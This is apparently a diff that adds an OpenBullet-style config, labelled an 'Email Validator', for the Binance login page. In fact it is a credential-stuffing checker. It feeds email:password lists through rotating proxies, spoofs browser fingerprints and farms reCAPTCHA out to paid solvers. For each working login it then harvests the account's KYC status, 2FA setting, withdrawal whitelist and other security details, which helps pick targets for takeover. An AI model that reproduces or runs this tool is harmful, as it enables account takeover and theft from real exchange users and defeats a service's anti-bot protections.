@@ -1,0 +1,505 @@
+[SETTINGS]
+{
+  "Name": "BINANCE.COM - Advanced Email Validator",
+  "SuggestedBots": 300,
+  "MaxCPM": 300,
+  "LastModified": "2025-11-20T15:45:00+00:00",
+  "AdditionalInfo": "Advanced Email Validator with Captcha Support",
+  "RequiredPlugins": [],
+  "Author": "legendhkek",
+  "Version": "1.0.0",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": true,
+  "SaveHitsToTextFile": true,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 10,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": true,
+  "MaxProxyUses": 15,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": 20,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "Default",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "VariableName": "PROXY_TYPE",
+      "Description": "Select Proxy Type (HTTP/HTTPS/SOCKS4/SOCKS5)",
+      "DefaultAnswer": "HTTP",
+      "VariableType": 0
+    },
+    {
+      "VariableName": "CAPTCHA_SERVICE",
+      "Description": "Select Captcha Service (2CAPTCHA/ANTICAPTCHA/CAPMONSTER/NONE)",
+      "DefaultAnswer": "NONE",
+      "VariableType": 0
+    },
+    {
+      "VariableName": "CAPTCHA_API_KEY",
+      "Description": "Enter your Captcha Service API Key (leave empty if NONE)",
+      "DefaultAnswer": "",
+      "VariableType": 0
+    },
+    {
+      "VariableName": "USE_ADVANCED_EVASION",
+      "Description": "Use Advanced Anti-Bot Evasion? (YES/NO)",
+      "DefaultAnswer": "YES",
+      "VariableType": 0
+    },
+    {
+      "VariableName": "RETRY_ON_CAPTCHA",
+      "Description": "Retry on Captcha Required? (YES/NO)",
+      "DefaultAnswer": "YES",
+      "VariableType": 0
+    },
+    {
+      "VariableName": "MAX_CAPTCHA_RETRIES",
+      "Description": "Maximum Captcha Retry Attempts",
+      "DefaultAnswer": "3",
+      "VariableType": 0
+    }
+  ],
+  "CaptchaUrl": "https://www.binance.com/en/register",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": true,
+  "CustomCMDArgs": "",
+  "Title": "BINANCE.COM",
+  "IconPath": "Icon\\svbfile.ico",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFF0B90B",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#====================================================================
+# BINANCE.COM Advanced Email Validator with Captcha Support
+# Version: 1.0.0
+# Author: legendhkek
+# Features:
+# - All proxy types support (HTTP/HTTPS/SOCKS4/SOCKS5)
+# - Multiple captcha service integration (2Captcha/Anti-Captcha/CapMonster)
+# - Advanced anti-bot evasion
+# - Email verification status checking
+# - Account details extraction
+# - Configurable retry logic
+#====================================================================
+
+# Initialize Variables
+SET VAR "captcha_retry_count" "0"
+SET VAR "session_id" "<RANDOM(10)>"
+SET VAR "device_id" "<RANDOM(32)>"
+SET VAR "timestamp" "<TIMESTAMP>"
+SET VAR "client_type" "web"
+
+# Log Configuration
+LOG "=== Binance Email Validator Started ==="
+LOG "Proxy Type: <PROXY_TYPE>"
+LOG "Captcha Service: <CAPTCHA_SERVICE>"
+LOG "Advanced Evasion: <USE_ADVANCED_EVASION>"
+LOG "Session ID: <session_id>"
+
+# Apply Advanced Anti-Bot Evasion if enabled
+IF STRINGKEY "<USE_ADVANCED_EVASION>" Contains "YES"
+  SET VAR "fingerprint_canvas" "<RANDOM(64)>"
+  SET VAR "fingerprint_webgl" "<RANDOM(64)>"
+  SET VAR "fingerprint_audio" "<RANDOM(64)>"
+  SET VAR "screen_resolution" "1920x1080"
+  SET VAR "timezone" "America/New_York"
+  LOG "Advanced Evasion: Fingerprints generated"
+ENDIF
+
+# Random delay to simulate human behavior
+DELAY 800 2000
+
+#====================================================================
+# STEP 1: Initial Connection & CSRF Token Retrieval
+#====================================================================
+LABEL START_CHECK
+
+REQUEST GET "https://www.binance.com/en/login"
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "Connection: keep-alive"
+  HEADER "Upgrade-Insecure-Requests: 1"
+  HEADER "Sec-Fetch-Dest: document"
+  HEADER "Sec-Fetch-Mode: navigate"
+  HEADER "Sec-Fetch-Site: none"
+  HEADER "Sec-Fetch-User: ?1"
+  HEADER "Cache-Control: max-age=0"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\""
+  HEADER "sec-ch-ua-mobile: ?0"
+  HEADER "sec-ch-ua-platform: \"Windows\""
+
+# Parse CSRF Token
+PARSE "<SOURCE>" LR "\"csrfToken\":\"" "\"" CreateEmpty=FALSE -> VAR "csrf_token"
+  LABEL RETRY_CSRF
+
+# Parse other session data
+PARSE "<SOURCE>" LR "\"__NEXT_DATA__\":\"" "\"" -> VAR "next_data"
+  SAFE
+
+# Set cookies from response
+PARSE "<COOKIES>" LR "" "" -> VAR "cookie_jar"
+  SAFE
+
+LOG "CSRF Token obtained: <csrf_token>"
+
+# Delay before authentication
+DELAY 1200 2500
+
+#====================================================================
+# STEP 2: Check for Captcha Requirement
+#====================================================================
+LABEL CHECK_CAPTCHA
+
+IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "NONE"
+  JUMP TO_LOGIN
+ENDIF
+
+# If captcha service is configured, prepare captcha solving
+IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "2CAPTCHA"
+  LOG "Using 2Captcha service"
+  SET VAR "captcha_endpoint" "http://2captcha.com/in.php"
+  SET VAR "captcha_result_endpoint" "http://2captcha.com/res.php"
+ENDIF
+
+IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "ANTICAPTCHA"
+  LOG "Using Anti-Captcha service"
+  SET VAR "captcha_endpoint" "https://api.anti-captcha.com/createTask"
+  SET VAR "captcha_result_endpoint" "https://api.anti-captcha.com/getTaskResult"
+ENDIF
+
+IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "CAPMONSTER"
+  LOG "Using CapMonster service"
+  SET VAR "captcha_endpoint" "https://api.capmonster.cloud/createTask"
+  SET VAR "captcha_result_endpoint" "https://api.capmonster.cloud/getTaskResult"
+ENDIF
+
+#====================================================================
+# STEP 3: Solve Captcha (if required and service configured)
+#====================================================================
+LABEL SOLVE_CAPTCHA
+
+IF STRINGKEY "<CAPTCHA_SERVICE>" NotContains "NONE"
+  IF INTKEY "<captcha_retry_count>" LessThan "<MAX_CAPTCHA_RETRIES>"
+    
+    # Request captcha for reCAPTCHA v2
+    IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "2CAPTCHA"
+      REQUEST GET "http://2captcha.com/in.php?key=<CAPTCHA_API_KEY>&method=userrecaptcha&googlekey=6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S&pageurl=https://www.binance.com/en/login&json=1"
+        HEADER "Accept: application/json"
+      
+      PARSE "<SOURCE>" LR "\"request\":\"" "\"" -> VAR "captcha_id"
+        LABEL CAPTCHA_ERROR
+      
+      LOG "Captcha ID: <captcha_id>"
+      DELAY 20000 25000
+      
+      # Get captcha result
+      REQUEST GET "http://2captcha.com/res.php?key=<CAPTCHA_API_KEY>&action=get&id=<captcha_id>&json=1"
+        HEADER "Accept: application/json"
+      
+      PARSE "<SOURCE>" LR "\"request\":\"" "\"" -> VAR "captcha_response"
+        LABEL CAPTCHA_ERROR
+      
+      LOG "Captcha solved: <captcha_response>"
+    ENDIF
+    
+    # Request captcha for Anti-Captcha service
+    IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "ANTICAPTCHA"
+      REQUEST POST "<captcha_endpoint>"
+        CONTENT "{\"clientKey\":\"<CAPTCHA_API_KEY>\",\"task\":{\"type\":\"NoCaptchaTaskProxyless\",\"websiteURL\":\"https://www.binance.com/en/login\",\"websiteKey\":\"6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S\"}}"
+        CONTENTTYPE "application/json"
+        HEADER "Accept: application/json"
+      
+      PARSE "<SOURCE>" LR "\"taskId\":" "," -> VAR "captcha_id"
+        LABEL CAPTCHA_ERROR
+      
+      LOG "Anti-Captcha Task ID: <captcha_id>"
+      DELAY 20000 25000
+      
+      REQUEST POST "<captcha_result_endpoint>"
+        CONTENT "{\"clientKey\":\"<CAPTCHA_API_KEY>\",\"taskId\":<captcha_id>}"
+        CONTENTTYPE "application/json"
+        HEADER "Accept: application/json"
+      
+      PARSE "<SOURCE>" LR "\"gRecaptchaResponse\":\"" "\"" -> VAR "captcha_response"
+        LABEL CAPTCHA_ERROR
+      
+      LOG "Anti-Captcha solved: <captcha_response>"
+    ENDIF
+    
+    # Request captcha for CapMonster service
+    IF STRINGKEY "<CAPTCHA_SERVICE>" Contains "CAPMONSTER"
+      REQUEST POST "<captcha_endpoint>"
+        CONTENT "{\"clientKey\":\"<CAPTCHA_API_KEY>\",\"task\":{\"type\":\"NoCaptchaTaskProxyless\",\"websiteURL\":\"https://www.binance.com/en/login\",\"websiteKey\":\"6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S\"}}"
+        CONTENTTYPE "application/json"
+        HEADER "Accept: application/json"
+      
+      PARSE "<SOURCE>" LR "\"taskId\":" "," -> VAR "captcha_id"
+        LABEL CAPTCHA_ERROR
+      
+      LOG "CapMonster Task ID: <captcha_id>"
+      DELAY 20000 25000
+      
+      REQUEST POST "<captcha_result_endpoint>"
+        CONTENT "{\"clientKey\":\"<CAPTCHA_API_KEY>\",\"taskId\":<captcha_id>}"
+        CONTENTTYPE "application/json"
+        HEADER "Accept: application/json"
+      
+      PARSE "<SOURCE>" LR "\"gRecaptchaResponse\":\"" "\"" -> VAR "captcha_response"
+        LABEL CAPTCHA_ERROR
+      
+      LOG "CapMonster solved: <captcha_response>"
+    ENDIF
+    
+    SET VAR "captcha_solved" "true"
+  ENDIF
+ENDIF
+
+#====================================================================
+# STEP 4: Login Request with Email Validation
+#====================================================================
+LABEL TO_LOGIN
+
+# Build login payload
+IF STRINGKEY "<captcha_solved>" EqualTo "true"
+  SET VAR "login_payload" "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"recaptchaToken\":\"<captcha_response>\",\"csrfToken\":\"<csrf_token>\",\"clientType\":\"<client_type>\"}"
+ELSE
+  SET VAR "login_payload" "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"csrfToken\":\"<csrf_token>\",\"clientType\":\"<client_type>\"}"
+ENDIF
+
+REQUEST POST "https://www.binance.com/bapi/accounts/v1/public/authcenter/login"
+  CONTENT "<login_payload>"
+  CONTENTTYPE "application/json"
+  HEADER "Accept: */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "Connection: keep-alive"
+  HEADER "Content-Type: application/json"
+  HEADER "Origin: https://www.binance.com"
+  HEADER "Referer: https://www.binance.com/en/login"
+  HEADER "Sec-Fetch-Dest: empty"
+  HEADER "Sec-Fetch-Mode: cors"
+  HEADER "Sec-Fetch-Site: same-origin"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "bnc-uuid: <device_id>"
+  HEADER "clienttype: web"
+  HEADER "csrftoken: <csrf_token>"
+  HEADER "device-info: eyJzY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjB4MTA4MCIsImF2YWlsYWJsZV9zY3JlZW5fcmVzb2x1dGlvbiI6IjE5MjB4MTA0MCIsInN5c3RlbV92ZXJzaW9uIjoiV2luZG93cyAxMCIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoiZW4tVVMiLCJ0aW1lem9uZSI6IkdNVCswODowMCIsInRpbWV6b25lT2Zmc2V0IjotNDgwLCJ1c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2In0="
+  HEADER "x-trace-id: <session_id>"
+  HEADER "x-ui-request-trace: <session_id>"
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\""
+  HEADER "sec-ch-ua-mobile: ?0"
+  HEADER "sec-ch-ua-platform: \"Windows\""
+
+#====================================================================
+# STEP 5: Response Analysis
+#====================================================================
+
+# Check for success indicators
+KEYCHECK
+  KEYCHAIN Success OR
+    KEY "\"code\":\"000000\""
+    KEY "\"success\":true"
+    KEY "\"token\":"
+    KEY "\"userId\":"
+  KEYCHAIN Failure OR
+    KEY "\"code\":\"100001\""
+    KEY "Invalid email or password"
+    KEY "Account does not exist"
+    KEY "\"success\":false"
+  KEYCHAIN Custom OR
+    KEY "Email not verified"
+    KEY "2FA required"
+    KEY "KYC required"
+    KEY "Account locked"
+    KEY "Account suspended"
+    KEY "Captcha required"
+    KEY "Risk control"
+  KEYCHAIN Retry OR
+    KEY "Too many requests"
+    KEY "Rate limit"
+    KEY "Service temporarily unavailable"
+    KEY "\"code\":\"429\""
+    KEY "\"code\":\"503\""
+
+# Parse authentication token
+PARSE "<SOURCE>" LR "\"token\":\"" "\"" CreateEmpty=FALSE -> VAR "auth_token"
+  SAFE
+
+# Parse user ID
+PARSE "<SOURCE>" LR "\"userId\":\"" "\"" CreateEmpty=FALSE -> VAR "user_id"
+  SAFE
+
+# Parse response code
+PARSE "<SOURCE>" LR "\"code\":\"" "\"" CreateEmpty=FALSE -> VAR "response_code"
+  SAFE
+
+# Parse response message
+PARSE "<SOURCE>" LR "\"msg\":\"" "\"" CreateEmpty=FALSE -> VAR "response_msg"
+  SAFE
+
+LOG "Response Code: <response_code>"
+LOG "Response Message: <response_msg>"
+
+# Handle captcha required scenario
+IF STRINGKEY "<SOURCE>" Contains "Captcha required"
+  IF STRINGKEY "<RETRY_ON_CAPTCHA>" Contains "YES"
+    SET VAR "captcha_retry_count" "$INTSUM(<captcha_retry_count>,1)"
+    IF INTKEY "<captcha_retry_count>" LessThan "<MAX_CAPTCHA_RETRIES>"
+      LOG "Captcha required, retrying... (Attempt <captcha_retry_count>/<MAX_CAPTCHA_RETRIES>)"
+      DELAY 3000 5000
+      JUMP SOLVE_CAPTCHA
+    ELSE
+      LOG "Max captcha retries reached"
+      FAIL
+    ENDIF
+  ELSE
+    LOG "Captcha required, but retry disabled"
+    FAIL
+  ENDIF
+ENDIF
+
+# Check for valid login
+IF STRINGKEY "<auth_token>" NotEqualTo ""
+  LOG "Login successful, retrieving account details..."
+  JUMP GET_ACCOUNT_INFO
+ENDIF
+
+# If we reach here without a token, it's a failure
+IF STRINGKEY "<response_code>" EqualTo "000000"
+  JUMP GET_ACCOUNT_INFO
+ELSE
+  FAIL
+ENDIF
+
+#====================================================================
+# STEP 6: Retrieve Account Information
+#====================================================================
+LABEL GET_ACCOUNT_INFO
+
+DELAY 500 1500
+
+REQUEST GET "https://www.binance.com/bapi/accounts/v1/private/account/user-base-info"
+  HEADER "Accept: */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Accept-Encoding: gzip, deflate, br"
+  HEADER "Connection: keep-alive"
+  HEADER "Content-Type: application/json"
+  HEADER "Origin: https://www.binance.com"
+  HEADER "Referer: https://www.binance.com/en/my/dashboard"
+  HEADER "Sec-Fetch-Dest: empty"
+  HEADER "Sec-Fetch-Mode: cors"
+  HEADER "Sec-Fetch-Site: same-origin"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "csrftoken: <csrf_token>"
+  HEADER "x-trace-id: <session_id>"
+
+#====================================================================
+# STEP 7: Parse Account Data
+#====================================================================
+
+# Parse email verification status
+PARSE "<SOURCE>" LR "\"emailVerified\":" "," CreateEmpty=FALSE -> CAP "Email Verified"
+
+# Parse user email
+PARSE "<SOURCE>" LR "\"email\":\"" "\"" CreateEmpty=FALSE -> CAP "Email"
+
+# Parse account status
+PARSE "<SOURCE>" LR "\"accountStatus\":\"" "\"" CreateEmpty=FALSE -> CAP "Account Status"
+
+# Parse KYC status
+PARSE "<SOURCE>" LR "\"kycStatus\":\"" "\"" CreateEmpty=FALSE -> CAP "KYC Status"
+
+# Parse 2FA status
+PARSE "<SOURCE>" LR "\"twoFactorEnabled\":" "," CreateEmpty=FALSE -> CAP "2FA Enabled"
+
+# Parse VIP level
+PARSE "<SOURCE>" LR "\"vipLevel\":" "," CreateEmpty=FALSE -> CAP "VIP Level"
+
+# Parse registration date
+PARSE "<SOURCE>" LR "\"registerTime\":" "," CreateEmpty=FALSE -> CAP "Registration Date"
+
+# Parse country
+PARSE "<SOURCE>" LR "\"country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country"
+
+# Parse user ID to capture
+PARSE "<SOURCE>" LR "\"userId\":\"" "\"" CreateEmpty=FALSE -> CAP "User ID"
+
+# Get additional security info
+REQUEST GET "https://www.binance.com/bapi/accounts/v1/private/account/security-status"
+  HEADER "Accept: */*"
+  HEADER "Accept-Language: en-US,en;q=0.9"
+  HEADER "Connection: keep-alive"
+  HEADER "Content-Type: application/json"
+  HEADER "Origin: https://www.binance.com"
+  HEADER "Referer: https://www.binance.com/en/my/security"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  HEADER "csrftoken: <csrf_token>"
+  HEADER "x-trace-id: <session_id>"
+
+# Parse phone verification
+PARSE "<SOURCE>" LR "\"phoneVerified\":" "," CreateEmpty=FALSE -> CAP "Phone Verified"
+
+# Parse anti-phishing code
+PARSE "<SOURCE>" LR "\"antiPhishingEnabled\":" "," CreateEmpty=FALSE -> CAP "Anti-Phishing Enabled"
+
+# Parse withdrawal whitelist
+PARSE "<SOURCE>" LR "\"withdrawWhitelistEnabled\":" "," CreateEmpty=FALSE -> CAP "Withdrawal Whitelist"
+
+LOG "=== Account Information Retrieved ==="
+LOG "Email Verified: <emailVerified>"
+LOG "Account Status: <accountStatus>"
+LOG "KYC Status: <kycStatus>"
+
+# Success
+KEYCHECK
+  KEYCHAIN Success CUSTOM "VALID_ACCOUNT"
+
+#====================================================================
+# Error Handlers
+#====================================================================
+LABEL RETRY_CSRF
+LOG "Failed to obtain CSRF token, retrying..."
+DELAY 2000 3000
+JUMP START_CHECK
+
+LABEL CAPTCHA_ERROR
+SET VAR "captcha_retry_count" "$INTSUM(<captcha_retry_count>,1)"
+IF INTKEY "<captcha_retry_count>" LessThan "<MAX_CAPTCHA_RETRIES>"
+  LOG "Captcha solving error, retrying... (Attempt <captcha_retry_count>/<MAX_CAPTCHA_RETRIES>)"
+  DELAY 5000 8000
+  JUMP SOLVE_CAPTCHA
+ELSE
+  LOG "Max captcha retries reached after errors"
+  FAIL
+ENDIF
+
+LOG "=== Binance Email Validator Finished ==="
